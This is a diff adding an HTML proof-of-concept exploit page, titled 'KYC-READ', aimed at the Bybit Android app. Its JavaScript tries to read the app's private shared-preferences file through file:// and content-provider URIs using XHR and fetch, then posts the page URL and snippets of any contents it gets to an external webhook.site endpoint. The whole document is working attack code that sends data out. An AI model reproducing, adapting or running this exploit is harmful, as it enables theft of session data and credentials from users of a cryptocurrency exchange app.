@@ -1,0 +1,20 @@
+<!doctype html><html><body style="font:15px monospace;padding:10px"><h3>KYC-READ</h3><pre id="o">start</pre>
+<script>
+var HOOK='https://webhook.site/2a05b999-357c-43f7-a6a2-4bc8cf26f376';
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+String(d).substr(0,1600)})}catch(e){}}
+var P='/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+var U1='content://com.bybit.app.fileProvider.com.crazecoder.openfile/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+var U2='content://com.bybit.app.adv_provider/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+var U3='file://'+P;
+function xhr(u,tag){try{var x=new XMLHttpRequest();x.open('GET',u,true);
+  x.onload=function(){var r='len='+((x.responseText||'').length);log(tag+' XHR_OK '+r);post(tag+'_OK',(x.responseText||'').substr(0,200))};
+  x.onerror=function(){log(tag+' XHR_ERR');post(tag+'_ERR','onerror')};
+  x.send()}catch(e){log(tag+' THROW '+e);post(tag+'_THROW',''+e)}}
+function fch(u,tag){try{fetch(u).then(function(r){return r.text()}).then(function(t){log(tag+' FETCH_OK len='+t.length);post(tag+'_FETCH_OK',t.substr(0,200))}).catch(function(e){log(tag+' FETCH_ERR '+e);post(tag+'_FETCH_ERR',''+e)})}catch(e){log(tag+' FTHROW '+e)}}
+log('href='+location.href);
+post('READ_PAGE',location.href);
+xhr(U1,'openfile'); xhr(U2,'mailer'); xhr(U3,'file');
+fch(U1,'openfile'); fch(U3,'file');
+setTimeout(function(){post('READ_DONE','done')},4000);
+</script></body></html>
